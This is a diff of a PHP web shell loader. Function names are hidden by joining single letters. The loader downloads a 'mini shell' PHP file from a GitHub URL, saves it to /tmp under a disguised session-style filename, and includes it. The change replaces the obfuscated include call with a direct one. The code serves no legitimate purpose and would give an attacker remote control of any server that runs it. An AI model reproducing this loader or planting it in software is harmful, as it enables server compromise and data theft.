@@ -4,7 +4,6 @@ $fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "
 $fo = "f" . "o" . "p" . "e" . "n";
 $fw = "f" . "w" . "r" . "i" . "t" . "e";
 $fc = "f" . "c" . "l" . "o" . "s" . "e";
-$inc = "i" . "n" . "c" . "l" . "u" . "d" . "e";
 
 $tmpfile = 'sess_' . md5('naxtarrr') . '.php';
 $data = ['https://raw.githubusercontent.com/im-hanzou/BypassServ-Mini-Shell/main/bypasserv-new.php', "/tmp/$tmpfile"];
@@ -23,4 +22,4 @@ if (!file_exists($data[1]) || filesize($data[1]) === 0) {
     echo '<script>window.location="?naxtarrr";</script>';
 }
 
-$inc($data[1]);
+include($data[1]);
